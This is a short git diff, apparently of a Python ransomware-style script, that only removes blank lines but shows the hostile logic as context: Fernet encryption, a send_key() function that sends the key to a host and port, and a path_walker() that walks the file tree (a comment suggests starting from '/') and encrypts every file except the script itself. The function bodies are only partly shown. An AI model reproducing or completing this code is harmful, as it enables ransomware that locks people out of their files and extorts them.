@@ -9,7 +9,6 @@ fnet = Fernet(key)
 
 
 def send_key(): # not sure about security with transmiting data over leaked ip
-
     TARGET = '127.0.0.1'
     PORT = 9997
 
@@ -41,11 +40,8 @@ def manage_file(file, mode='encrypt'):
 
 
 def path_walker():
-
     start = os.getcwd() # or '/' for scanning whole system on Linux
-
     for root, dirs, files in os.walk(start):
-
         for file in files:
             if file != sys.argv[0]:
                 try:
@@ -55,7 +51,6 @@ def path_walker():
 
 
 def main():
-
     send_key()
     path_walker()
 
